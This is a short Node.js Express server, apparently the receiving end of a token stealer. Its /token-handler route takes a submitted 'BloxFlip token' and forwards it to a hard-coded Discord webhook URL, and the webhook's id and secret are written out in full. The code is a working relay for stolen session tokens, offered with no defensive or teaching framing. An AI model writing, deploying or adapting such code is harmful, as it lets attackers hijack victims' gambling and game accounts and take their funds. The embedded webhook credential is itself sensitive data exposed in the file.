const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const port = 3000;

// Parse JSON bodies
app.use(bodyParser.json());

// Route to handle token
app.post('/token-handler', (req, res) => {
    const { token } = req.body;
    if (token) {
        // Forward token to Discord webhook
        axios.post('https://discord.com/api/webhooks/1230666734516830291/z9JYDsdaZuSdKP7IcnUUFcxknnAPArPamdodqDasO2WDAs9kbwIbQuoTp95gGTUAnCWt', {
            content: `BloxFlip token: ${token}`
        })
        .then(() => {
            res.sendStatus(200);
        })
        .catch((error) => {
            console.error('Error sending token to Discord webhook:', error);
            res.sendStatus(500);
        });
    } else {
        res.sendStatus(400); // Bad request if token is missing
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${3000}`);
});